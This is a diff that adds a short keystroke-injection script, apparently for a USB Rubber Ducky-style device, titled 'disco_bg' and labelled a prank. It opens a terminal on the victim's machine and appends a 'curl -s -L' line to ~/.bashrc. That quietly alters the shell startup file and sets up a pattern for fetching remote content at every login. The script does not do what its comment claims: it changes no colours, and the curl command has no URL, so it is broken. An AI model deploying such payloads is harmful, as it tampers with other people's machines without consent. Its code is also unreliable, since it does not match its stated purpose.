@@ -1,0 +1,9 @@
+REM Title: disco_bg
+REM Category: Prank
+REM changes terminal background color continually
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 2000
+STRING echo "curl -s -L " >> ~/.bashrc
+ENTER
